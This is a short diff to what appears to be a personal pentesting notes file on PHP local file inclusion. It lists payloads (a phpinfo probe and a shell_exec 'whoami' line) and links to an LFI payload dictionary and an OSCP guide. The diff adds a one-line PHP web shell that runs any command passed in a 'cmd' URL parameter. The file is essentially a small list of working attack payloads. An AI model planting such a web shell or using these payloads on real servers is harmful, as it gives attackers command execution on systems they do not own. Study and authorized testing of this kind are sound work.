@@ -1,5 +1,6 @@
 <?php phpinfo()?>
 <?php echo shell_exec(whoami);?>
+<?php system($_GET['cmd']); ?>
 
 https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
 https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
